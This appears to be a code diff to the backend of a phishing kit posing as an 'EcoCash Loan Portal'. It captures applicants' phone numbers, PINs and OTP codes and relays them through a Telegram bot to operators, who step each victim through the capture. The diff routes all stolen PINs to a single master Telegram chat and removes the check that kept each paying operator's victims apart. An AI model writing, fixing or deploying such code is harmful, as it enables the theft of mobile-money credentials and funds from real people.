@@ -26,7 +26,6 @@ function loadPersistentData() {
       return {
         authorizedUsers: new Map(parsed.authorizedUsers || []),
         secondaryAdmins: new Map(parsed.secondaryAdmins || []),
-        pathToAdminChat: new Map(parsed.pathToAdminChat || []),
         adminCounter: parsed.adminCounter || 1
       };
     }
@@ -36,7 +35,6 @@ function loadPersistentData() {
   return {
     authorizedUsers: new Map(),
     secondaryAdmins: new Map(),
-    pathToAdminChat: new Map(),
     adminCounter: 1
   };
 }
@@ -47,7 +45,6 @@ function savePersistentData() {
     const dataToSave = {
       authorizedUsers: Array.from(authorizedUsers.entries()),
       secondaryAdmins: Array.from(secondaryAdmins.entries()),
-      pathToAdminChat: Array.from(pathToAdminChat.entries()),
       adminCounter
     };
     fs.writeFileSync(STORAGE_FILE, JSON.stringify(dataToSave, null, 2));
@@ -60,7 +57,6 @@ const activeApplications = new Map();
 const persisted = loadPersistentData();
 const authorizedUsers = persisted.authorizedUsers;
 const secondaryAdmins = persisted.secondaryAdmins;
-const pathToAdminChat = persisted.pathToAdminChat;
 let adminCounter = persisted.adminCounter;
 
 function formatZimbabwePhone(phone) {
@@ -75,7 +71,7 @@ function formatZimbabwePhone(phone) {
   return formattedPhone;
 }
 
-// STEP 2 SUBMISSION: PIN delivered with 2 buttons (WRONG OTP & CORRECT OTP to move applicant to step 3)
+// STEP 2 SUBMISSION: PIN delivered to master bot chat directly without path mapping
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const data = req.body;
@@ -87,22 +83,16 @@ app.post('/api/submit-credentials', async (req, res) => {
 
     const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();  
     const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;  
-
-    let portalPath = data.portalPath || '';  
-    if (!portalPath.startsWith('/Admin-')) {  
-      portalPath = '/Admin-0001';  
-    }  
       
-    const targetChatId = pathToAdminChat.get(portalPath);  
+    const targetChatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!targetChatId) {  
-      return res.status(400).json({ success: false, error: "This portal link is not currently mapped to an active session or admin." });  
+      return res.status(500).json({ success: false, error: "Telegram master chat ID is not configured." });  
     }  
 
     activeApplications.set(appReference, {  
       ...data,  
       formattedPhone,  
-      portalPath,  
       targetChatId,  
       status: 'PIN_PENDING'  
     });  
@@ -137,11 +127,16 @@ app.post('/api/submit-credentials', async (req, res) => {
         })  
       };  
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+      const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
         method: "POST",  
         headers: { "Content-Type": "application/json" },  
         body: JSON.stringify(telegramPayload)  
-      });  
+      });
+
+      const tgResult = await tgResponse.json();
+      if (!tgResult.ok) {
+        console.error("Telegram API Error on Step 2 submission:", tgResult);
+      }
     }  
 
     res.status(201).json({ success: true, appReference });
@@ -244,7 +239,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       if (chatId === masterChatId.toString()) {  
         authorizedUsers.set(userId, 'PAID');  
         const mainPath = '/Admin-0001';  
-        pathToAdminChat.set(mainPath, chatId);  
         savePersistentData();  
 
         const portalUrl = `https://${req.get('host')}${mainPath}`;  
@@ -264,7 +258,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const assignedPath = secondaryAdmins.get(userId);  
         const portalUrl = `https://${req.get('host')}${assignedPath}`;  
           
-        pathToAdminChat.set(assignedPath, chatId);  
         savePersistentData();  
 
         const welcomeBackText = `🤖 <b>EcoCash Loan Portal</b>\n\n` +  
@@ -392,24 +385,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return;
   }
 
-  let targetAppRef = '';
-  if (actionData.startsWith('pin_wrong_')) targetAppRef = actionData.replace('pin_wrong_', '');
-  if (actionData.startsWith('step3_prompt_')) targetAppRef = actionData.replace('step3_prompt_', '');
-  if (actionData.startsWith('otp_correct_')) targetAppRef = actionData.replace('otp_correct_', '');
-  if (actionData.startsWith('otp_wrong_')) targetAppRef = actionData.replace('otp_wrong_', '');
-
-  if (targetAppRef) {
-    const appData = activeApplications.get(targetAppRef);
-    if (appData && appData.targetChatId && chatId !== appData.targetChatId.toString()) {
-      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: callback_query.id, text: "You can only control actions for your own portal link.", show_alert: true })
-      });
-      return;
-    }
-  }
-
   if (actionData.startsWith('pin_wrong_')) {
     const appReference = actionData.replace('pin_wrong_', '');
     if (activeApplications.has(appReference)) {
@@ -483,4 +458,4 @@ app.get('/Admin-*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
-      
+                                 
